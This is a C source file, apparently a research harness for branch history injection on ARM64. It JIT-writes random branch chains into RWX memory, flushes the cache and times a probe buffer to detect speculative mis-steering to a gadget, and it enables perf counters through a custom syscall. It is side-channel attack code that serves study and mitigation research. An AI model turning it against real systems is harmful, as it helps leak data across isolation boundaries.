#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <time.h>
#include "targets.h"
#include "helper.h"

#define HISTORY_SIZE        64
#define ITER                100
#define IN_PLACE            1

#define B_OPCODE            (0x14000000U)
#define B_OFF_MASK_OPC      (0x03ffffffU)
#define B_OFF_MASK          (0x01ffffffU)
#define MAX_MEM             (0x04000000<<2)
#define BHI_ENABLE_SYSCALL  442

typedef uint64_t (*t_chain)(void *target, void *arg);
typedef void (*t_target)(void *target);
extern void ret_gadget(void *arg);
extern void hit_gadget(void *arg);
extern void ind_gadget(void *arg);

t_target ftable[2] = {&ret_gadget, hit_gadget};

void jit(uint8_t *mem, uint64_t *history)
{
    for(int i=0; i<HISTORY_SIZE-1; i++)
    {
        uint32_t offset = (history[i+1]>>2) - (history[i]>>2);
        uint32_t opcode = B_OPCODE | (offset & B_OFF_MASK_OPC);
        memcpy(&mem[history[i]], &opcode, 4);
        //printf("%08lx %p\n", history[i],  &mem[history[i]]);
        //fflush(stdout);
        __clear_cache(&mem[history[i]], &mem[history[i]+4]);
    }
    memcpy(&mem[history[HISTORY_SIZE-1]], &ind_gadget, 8);
    __clear_cache(&mem[history[HISTORY_SIZE-1]], &mem[history[HISTORY_SIZE-1]+8]);
    //printf("%08lx %p\n", history[HISTORY_SIZE-1],  &mem[history[HISTORY_SIZE-1]]);
    //fflush(stdout);
}

int main(int argc, char **argv)
{
    uint8_t *fr_buf;
    uint8_t *mem;
    uint64_t hit_history[HISTORY_SIZE];
    uint64_t ret_history[HISTORY_SIZE];
    int hits;
    int round;
    uint64_t r, ok;

    //enable perf counter via custom syscall
    syscall(BHI_ENABLE_SYSCALL);  
    srand(time(0));

    fr_buf = mmap(NULL, STRIDE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
    memset(fr_buf, 0x41, STRIDE);
            
    mem = mmap(NULL, MAX_MEM, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
    printf("rwx mem: %p\n", mem);

    //Create and jit once the hit history
    for(int i=0; i<HISTORY_SIZE; i++) hit_history[i] = (rand()&B_OFF_MASK)<<2;
    jit(mem, hit_history);
    t_chain hit_ptr = (t_chain) &mem[hit_history[0]];
    hit_ptr(&ftable[1], fr_buf);

    round = 0;
    while(1)
    {
        round++;
        hits = 0;

        printf("\r[Round %d] ", round);
        fflush(stdout);

        //Create a new ret history
        for(int i=0; i<HISTORY_SIZE; i++)
        {
            ok = 0;
            while(!ok)
            {
                ok = 1;
                r = (rand()&B_OFF_MASK)<<2; 

                for(int j=0; j<HISTORY_SIZE; j++)
                {
                    if(labs((int64_t)(r-hit_history[j])) < 16) ok = 0;    
                    continue;
                }
                
                for(int j=0; j<i; j++)
                {
                    if(labs((int64_t)(r-ret_history[j])) < 16) ok = 0;    
                    continue;
                }
            }
            ret_history[i] = r;
        }

#if IN_PLACE == 1
        ret_history[HISTORY_SIZE-1] = hit_history[HISTORY_SIZE-1];
#endif

        jit(mem, ret_history);
        t_chain ret_ptr = (t_chain) &mem[ret_history[0]];

        for(int i=0; i<ITER; i++)
        {
            hit_ptr(&ftable[1], fr_buf);

            clflush(&ftable[0]);
            clflush(&ftable[1]);
            clflush(fr_buf);
            
            ret_ptr(&ftable[0], fr_buf);

            if (load_time(fr_buf) < THR) {
                hits++;
            }
        }

        if(hits > ITER/2)
        {
            printf("hits: %d\n", hits);
        }
    }

    return 0;
}
